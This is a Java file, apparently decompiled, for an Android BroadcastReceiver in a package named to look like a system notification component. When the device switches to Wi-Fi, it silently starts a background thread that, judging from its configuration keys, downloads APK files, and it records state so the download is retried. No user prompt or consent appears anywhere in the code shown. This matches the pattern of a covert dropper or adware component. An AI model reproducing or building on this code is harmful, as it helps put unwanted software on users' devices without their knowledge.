package com.android.notification;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo.State;
import com.android.notification.configure.ConfigureFile;
import com.android.notification.configure.DownApkXmlKey;
import com.android.notification.configure.PropertiesKey.PushConfig;
import com.android.notification.util.AppUtil;
import com.android.notification.util.Tool;
import java.io.IOException;

public class WebRecevier extends BroadcastReceiver {
    private static Thread downThread = null;

    public void onReceive(Context context, Intent intent) {
        try {
            if (intent.getAction().equals("android.net.conn.CONNECTIVITY_CHANGE") && AppUtil.hasSdcard()) {
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:WebRecevier  func:onReceive  text:onReceive");
                State state = ((ConnectivityManager) context.getSystemService("connectivity")).getNetworkInfo(1).getState();
                boolean isBreak = intent.getBooleanExtra("noConnectivity", false);
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:WebRecevier  func:onReceive  text:isBreak = " + isBreak);
                if (State.CONNECTED != state || isBreak) {
                    Tool.WritePropertie(ConfigureFile.PushConfigFile, PushConfig.APK_BE_DOWN, "true");
                    AppUtil.CheckRecordFile();
                } else {
                    Tool.JWDlog(DownApkXmlKey.ROOT, "class:WebRecevier  func:onReceive  text:using WIFI now");
                    AppUtil.Checkconfigfile(context, intent);
                    String web_change_time = Tool.ReadPropertie(ConfigureFile.PushConfigFile, PushConfig.APK_BE_DOWN);
                    if (Tool.isStrEmpty(web_change_time) || Boolean.parseBoolean(web_change_time)) {
                        AppUtil.CheckRecordFile();
                        Tool.WritePropertie(ConfigureFile.PushConfigFile, PushConfig.APK_BE_DOWN, "false");
                        if (downThread == null || !downThread.isAlive()) {
                            downThread = new DownThread(context, intent);
                            downThread.start();
                        }
                    } else {
                        Tool.JWDlog(DownApkXmlKey.ROOT, "class:WebRecevier  func:onReceive  text:refuse to down again");
                        return;
                    }
                }
                Tool.JWDlog(DownApkXmlKey.ROOT, "class:WebRecevier  func:onReceive  text:onReceive over");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
